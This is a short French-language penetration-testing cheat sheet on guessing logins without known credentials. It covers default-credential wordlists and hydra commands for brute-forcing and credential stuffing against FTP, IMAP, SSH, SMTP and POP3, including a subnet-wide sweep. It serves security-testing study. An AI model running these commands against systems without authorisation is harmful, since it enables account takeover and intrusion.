---
public: true # set to true to make the article publishable
---

## Sans connaitre un identifiant ou mot de passe

### Comptes par défaut ou très fréquemment utilisés

Selon le service à attaquer, on pourra utiliser hydra avec le paramètre `-C` et fournir un dictionnaire (wordlist) contenant des couples `utilisateur:mot_de_passe` séparés par un `:`

Plusieures wordlist de ce type sont disponibles dans `/usr/share/seclists/Passwords/Default-Credentials/` (notamment `ftp-betterdefaultpasslist.txt`)

### Tenter des utilisateurs et mots de passe communs

####  Liste de comptes utilisateurs
On 


```
hydra -l user -P passlist.txt ftp://192.168.0.1
hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN

# credential stuffing
hydra -C user_pass.list ssh://$TARGET_IP
hydra -l admin -p password ftp://[192.168.0.0/24]/
hydra -L logins.txt -P pws.txt -M targets.txt ssh

# bruteforce mail service password for known user
hydra -l 'rebrec@domain.com' -P password.list  $TARGET_IP smtp -t 64  
hydra -l 'rebrec@domain.com' -P password.list  $TARGET_IP pop3 -t 64 
hydra -l 'rebrec@domain.com' -P password.list  $TARGET_IP imap -t 64 

```
Plus d'exemple d'utilisation de l'outil : [[Hydra]]
